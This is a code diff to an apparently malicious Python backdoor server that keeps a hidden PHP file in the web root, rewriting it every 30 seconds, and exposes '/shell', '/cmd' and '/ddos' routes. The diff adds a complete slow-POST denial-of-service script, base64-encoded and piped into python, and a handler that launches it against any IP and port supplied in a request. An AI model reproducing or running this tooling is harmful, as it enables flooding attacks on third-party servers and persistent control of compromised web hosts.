@@ -80,7 +80,7 @@ scan_path = '/var/www/html'
 
 
 # routers
-routers = ['/dos','/shell','/cmd','/state']
+routers = ['/ddos','/shell','/cmd','/state']
 
 # undead shell path
 shell_path = '/var/www/html/.1.php'
@@ -88,6 +88,9 @@ shell_path = '/var/www/html/.1.php'
 # undead shell content
 shell_content = "<?php phpinfo();?>\r"
 shell_content =  shell_content + ' ' * len(shell_content) + "\n"
+
+# running threads
+thread_array = {}
 
 ############################
 
@@ -104,6 +107,70 @@ def g_undead_shell():
 		time.sleep(30)
 
 
+def ddos_thread(ip,port):
+	'''
+		using extremely large http content-length to ddos
+
+	'''
+	python_script = '''#!/usr/bin/env python
+import socket
+import time
+import sys
+import threading
+#Pressure Test,ddos tool
+#---------------------------
+MAX_CONN=200000
+PORT= {{port}}
+HOST= '{{ip}}'
+PAGE= '/'
+#---------------------------
+
+buf=("POST %s HTTP/1.1\\r\\n"
+"Host: %s\\r\\n"
+"Content-Length: 10000000\\r\\n"
+"Keep-Alive: 900\\r\\n"
+"Cookie: hack by Redbud\\r\\n"
+"\\r\\n" % (PAGE,HOST))
+
+socks=[]
+
+def conn_thread():
+	global socks
+	for i in range(0,MAX_CONN):
+		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+		try:
+			s.connect((HOST,PORT))
+			s.send(buf)
+			print "Send buf OK!,conn=%d\\n"%i
+			socks.append(s)
+		except Exception,ex:
+			print "Could not connect to server or send error:%s"%ex
+			time.sleep(10)
+#end def
+
+def send_thread():
+	global socks
+	while True:
+		for s in socks:
+			try:
+				s.send("f")
+				print "send OK!"
+			except Exception,ex:
+				print "Send Exception:%s\\n"%ex
+				socks.remove(s)
+				s.close()
+		time.sleep(1)
+#end def
+
+for i in xrange(2):
+		conn_th=threading.Thread(target=conn_thread,args=())
+		send_th=threading.Thread(target=send_thread,args=())
+		conn_th.start()
+		send_th.start()'''.replace('{{ip}}',ip).replace('{{port}}',port)
+
+	python_script = base64.b64encode(python_script)
+
+	os.popen('echo %s | base64 -d|python'%python_script)
 
 
 
@@ -262,13 +329,39 @@ printf "udp_listen: %s\n" $udp_ports'''
 		else:
 			self.error_handle('error: ' + shell_log_file + ' does not exist')
 		
+	def ddos_handle(self,params):
+		'''
+			for ddos attack against other server
+		'''	
+		if params.has_key('ip') and params.has_key('port'):
 
-		
+			ip = params['ip'][0]
+			port = params['port'][0]
+			tgt_socket = ip + ':' + str(port)
+
+			# start a thread for ddos attack
+			thread_name ='ddos_' + str(int(time.time()))
+			t = threading.Thread(target=ddos_thread,args=(ip,port),name=thread_name)
+			t.setDaemon(True)
+			t.start()
+
+			# you'd better not attack the same target
+			if thread_array.has_key(tgt_socket):
+				thread_array[tgt_socket + '_' + str(int(time.time()))] = t
+			else:
+				thread_array[tgt_socket] = t
 
 
+			msg = "start a new thread to attack %s\n"%tgt_socket
+			for t in thread_array:
+				if 'ddos' in thread_array[t].name:
+					msg +=  thread_array[t].name + ' => ' + t + "\n"
 
+			self.success_handle(msg)
+			
 
-
+		else:
+			self.error_handle('error: insufficient args')
 
 
 
@@ -312,12 +405,17 @@ class MyTCPServer(SocketServer.TCPServer):
 t = threading.Thread(target=g_undead_shell,name='g_undead_shell')
 t.setDaemon(True)
 t.start()
+thread_array['g_undead_shell'] = t
 
 
 
 httpd = MyTCPServer(("", listen_port), CustomHTTPRequestHandler)
 print "serving at port", listen_port
-httpd.serve_forever()
+
+try:
+	httpd.serve_forever()
+except Exception,e:
+	sys.exit()
 
 
 
